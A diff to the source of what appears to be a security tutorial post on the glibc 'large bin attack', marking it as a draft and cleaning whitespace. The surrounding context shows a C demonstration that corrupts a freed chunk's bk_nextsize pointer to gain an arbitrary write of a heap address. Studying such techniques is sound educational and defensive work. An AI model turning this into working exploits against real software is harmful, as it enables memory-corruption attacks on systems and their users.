@@ -7,6 +7,7 @@
     description: "Exploiting the Large Bin sorting logic to achieve an arbitrary write of a heap address.",
     date: "2025-12-26",
     order: 32,
+    draft: true,
   ),
 )<frontmatter>
 
@@ -41,7 +42,7 @@ int main() {
     // 1. Allocate a large chunk and a barrier
     void *p1 = malloc(0x420); // Large enough for large bin
     malloc(0x20);             // Barrier 1
-    
+
     // 2. Allocate a second large chunk and a barrier
     void *p2 = malloc(0x410); // Slightly smaller than p1
     malloc(0x20);             // Barrier 2
@@ -54,12 +55,12 @@ int main() {
     free(p2);
 
     // ------------ VULNERABILITY ------------
-    /* 
+    /*
        We corrupt p1's metadata while it's in the Large Bin.
-       We set bk_nextsize to (target - 0x20) because the allocator will 
+       We set bk_nextsize to (target - 0x20) because the allocator will
        perform: victim->bk_nextsize->fd_nextsize = victim
     */
-    ((unsigned long*)p1)[3] = (unsigned long)(&target - 4); 
+    ((unsigned long*)p1)[3] = (unsigned long)(&target - 4);
     // ---------------------------------------
 
     // 5. Trigger sorting of p2
